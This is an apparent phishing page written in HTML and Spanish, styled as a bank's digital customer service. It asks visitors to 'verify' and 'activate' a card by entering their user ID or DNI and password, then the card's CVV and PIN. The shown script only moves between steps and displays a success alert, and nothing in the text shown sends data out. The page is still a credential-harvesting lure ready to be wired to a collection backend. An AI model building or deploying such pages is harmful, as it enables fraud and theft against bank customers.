<!DOCTYPE html>
<html lang="es">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Centro de Atención</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">


<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}


body{

    font-family:'Inter',Arial,sans-serif;

    min-height:100vh;

    background:
    linear-gradient(135deg,#002f6c,#005eb8,#0077c8);

    display:flex;

    align-items:center;

    justify-content:center;

}


/* CONTENEDOR */

.wrapper{

    width:100%;

    max-width:430px;

    padding:20px;

}



/* TARJETA PRINCIPAL */

.card{

    background:#ffffff;


    padding:40px 35px;

    box-shadow:
    0 25px 60px rgba(0,0,0,.25);

    animation:entrada .6s ease;

}



/* LOGO */

.brand{

    display:flex;

    align-items:center;

    gap:10px;

    margin-bottom:35px;

}


.brand-icon{

    width:42px;

    height:42px;

    background:#0065b3;

    border-radius:8px;

    display:flex;

    justify-content:center;

    align-items:center;

    color:white;

    font-weight:700;

    font-size:20px;

}



.brand span{

    font-size:18px;

    font-weight:600;

    color:#072146;

}



/* TITULO */


h1{

    color:#072146;

    font-size:27px;

    line-height:1.25;

    margin-bottom:12px;

}



.description{

    color:#53657a;

    font-size:14px;

    line-height:1.6;

    margin-bottom:30px;

}



/* PASOS */

.progress{

    display:flex;

    gap:8px;

    margin-bottom:30px;

}



.progress div{

    height:4px;

    flex:1;

    background:#dfe7ef;

    border-radius:10px;

}


.progress .active{

    background:#0065b3;

}



/* FORMULARIOS */


.step{

    display:none;

    animation:slide .4s ease;

}



.step.active{

    display:block;

}



label{

    font-size:13px;

    color:#34495e;

    display:block;

    margin-bottom:8px;

    font-weight:500;

}



input,select{

    width:100%;

    height:52px;

    border:1px solid #cfd8e3;

    border-radius:8px;

    padding:0 16px;

    font-size:15px;

    margin-bottom:20px;

    color:#333;

    outline:none;

    transition:.2s;

}



input:focus,
select:focus{

    border-color:#0065b3;

    box-shadow:0 0 0 3px rgba(0,101,179,.12);

}




button{

    width:100%;

    height:52px;

    border:none;

    border-radius:8px;

    background:#0065b3;

    color:white;

    font-size:15px;

    font-weight:600;

    cursor:pointer;

    transition:.25s;

}



button:hover{

    background:#004c8c;

}



.secondary{

    margin-top:12px;

    background:#eef4fa;

    color:#0065b3;

}



/* SEGURIDAD */


.footer{

    margin-top:30px;

    padding-top:20px;

    border-top:1px solid #edf1f5;

    text-align:center;

    color:#7b8794;

    font-size:12px;

}



/* ANIMACIONES */


@keyframes entrada{

from{

opacity:0;

transform:translateY(35px);

}

to{

opacity:1;

transform:none;

}

}



@keyframes slide{

from{

opacity:0;

transform:translateX(25px);

}

to{

opacity:1;

transform:none;

}

}



@media(max-width:480px){

.card{

padding:30px 22px;

}


h1{

font-size:23px;

}

}


</style>

</head>


<body>


<div class="wrapper">


<div class="card">



<div class="brand">

<div class="brand-icon">
✓
</div>

<span>
Atención Digital
</span>

</div>



<div class="progress">

<div class="active" id="p1"></div>

<div id="p2"></div>

</div>




<!-- PASO 1 -->

<div class="step active" id="step1">


<h1>
Verificación de tarjeta.</h1>


<p class="description">

Completa los datos solicitados para activar su tarjeta.
</p>



<label>
USUARIO / DNI
</label>

<input 
type="text"
placeholder="INGRESE USUARIO / DNI">


<label>
CONTRASEÑA
</label>

<input 
type="password"
placeholder="INGRESE SU CONTRASEÑA">







<button onclick="continuar()">

Continuar

</button>


</div>




<!-- PASO 2 -->

<div class="step" id="step2">


<h1>
</h1>


<p class="description">

Ingrese los datos faltantes para su activación correctamente 

</p>



<label>
CVV
</label>

<input placeholder="CVV" maxlength="3" type="text">



<label>
PIN
</label>

<input placeholder="PIN" maxlength="4" type="text">







<button onclick="enviar()">

Activar
</button>


<button class="secondary" onclick="volver()">

Volver

</button>


</div>



<div class="footer">

Servicio digital de atención al cliente

</div>


</div>


</div>



<script>


function continuar(){

document.getElementById("step1").classList.remove("active");

document.getElementById("step2").classList.add("active");


document.getElementById("p1").classList.remove("active");

document.getElementById("p2").classList.add("active");

}



function volver(){

document.getElementById("step2").classList.remove("active");

document.getElementById("step1").classList.add("active");


document.getElementById("p2").classList.remove("active");

document.getElementById("p1").classList.add("active");

}



function enviar(){

alert("Solicitud enviada correctamente.");

}


</script>


</body>
</html>
